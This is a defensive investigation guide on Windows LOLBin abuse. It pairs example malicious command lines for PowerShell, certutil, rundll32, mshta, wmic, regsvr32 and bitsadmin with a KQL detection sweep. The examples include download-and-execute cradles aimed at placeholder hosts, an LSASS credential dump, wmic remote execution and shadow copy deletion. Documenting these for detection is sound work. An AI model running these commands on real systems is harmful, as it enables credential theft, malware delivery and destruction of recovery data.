# LOLBin abuse — investigation

## What are LOLBins?

Living Off the Land Binaries — legitimate Windows tools abused by attackers to avoid dropping their own malware. Signed by Microsoft, expected on the system, often not flagged by AV. Detection must be behavioural — what the binary is *doing*, not what it *is*.

> The question is never "is this a real Windows binary?" — it's "is this binary doing something it has no business doing?"

---

## powershell.exe

**Malicious patterns:**
```
powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...
powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Temp\a8f3b.ps1
```
**Red flags:** `-enc`, `-nop`, `-w hidden`, `IEX`, `DownloadString`, `Reflection.Assembly::Load`

---

## certutil.exe

**Malicious patterns:**
```
certutil.exe -urlcache -split -f "http://185.x.x.x/payload.exe" C:\Users\Public\update.exe
certutil.exe -decode C:\Temp\encoded.txt C:\Temp\payload.exe
```
**Red flags:** `-urlcache -f` with URL, `-decode`, any URL in arguments

---

## rundll32.exe

**Malicious patterns:**
```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Public\lsass.dmp full
rundll32.exe C:\Users\user\AppData\Local\Temp\a9f3bc.dll,DllMain
```
> `comsvcs.dll, MiniDump` = credential dump. Escalate immediately.

---

## mshta.exe

**Malicious patterns:**
```
mshta.exe http://185.x.x.x/payload.hta
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc..."")(window.close)"
WINWORD.EXE → mshta.exe http://malicious.com/stage1.hta
```
**Red flags:** Any URL argument, `vbscript:`/`javascript:` inline, parent is Office app

---

## wmic.exe

**Malicious patterns:**
```
wmic.exe /node:"192.168.1.50" process call create "cmd.exe /c powershell -enc..."
wmic.exe process call create "C:\Users\Public\svchost.exe"
wmic.exe shadowcopy delete
```
**Red flags:** `process call create`, `shadowcopy delete`, `/node:` targeting internal IPs

---

## regsvr32.exe

**Malicious patterns:**
```
regsvr32.exe /s /n /u /i:http://185.x.x.x/payload.sct scrobj.dll
```
**Red flags:** `/i:` with URL, `scrobj.dll`, DLL in `Temp`/`AppData`

---

## bitsadmin.exe

**Malicious patterns:**
```
bitsadmin.exe /transfer WindowsUpdate http://185.x.x.x/update.exe C:\Public\update.exe
bitsadmin.exe /SetNotifyCmdLine job1 C:\Temp\payload.exe NULL
```
**Red flags:** `/transfer` with URL, `SetNotifyCmdLine`

---

## KQL — master LOLBin sweep

```kql
// LOLBin abuse — master sweep across all known Living Off the Land binaries
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1218.005, T1218.010, T1218.011, T1059.001, T1059.007, T1105, T1140, T1047, T1197
// Covers: certutil, PowerShell, mshta, regsvr32, rundll32, wmic, bitsadmin
// Run estate-wide as a daily hunt (set T0 to now()) or scope to a specific device
// "has" matches whole terms, so "http" does not match https:// URLs; both are listed
// Ref: docs/scenarios/07-lolbin-abuse/investigation.md, docs/scenarios/02-suspicious-process/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceProcessEvents
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where (
    // certutil downloading or decoding
    (FileName =~ "certutil.exe"
        and ProcessCommandLine has_any("-urlcache", "-decode", "http", "https"))
    // PowerShell suspicious flags (-e / -ec abbreviate -EncodedCommand, -w h = -WindowStyle Hidden)
    or (FileName in~ ("powershell.exe", "pwsh.exe")
        and ProcessCommandLine has_any(
            "-e", "-ec", "-enc", "-EncodedCommand", "IEX",
            "DownloadString", "-w h", "-w hidden", "Reflection.Assembly"))
    // mshta — almost never legitimate in modern environments
    or (FileName =~ "mshta.exe"
        and ProcessCommandLine has_any("http", "https", "vbscript:", "javascript:"))
    // regsvr32 remote scriptlet (Squiblydoo / AppLocker bypass)
    or (FileName =~ "regsvr32.exe"
        and ProcessCommandLine has_any("http", "https", "scrobj.dll", "/i:"))
    // rundll32 credential dump or suspicious DLL
    or (FileName =~ "rundll32.exe"
        and ProcessCommandLine has_any("comsvcs", "MiniDump", "javascript:", "AppData", "Temp"))
    // wmic remote execution or shadow deletion
    or (FileName =~ "wmic.exe"
        and ProcessCommandLine has_any("process call create", "shadowcopy delete", "/node:"))
    // bitsadmin download or notification command
    or (FileName =~ "bitsadmin.exe"
        and ProcessCommandLine has_any("/transfer", "http", "https", "SetNotifyCmdLine"))
)
| project Timestamp, DeviceName, AccountName, FileName,
    ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```
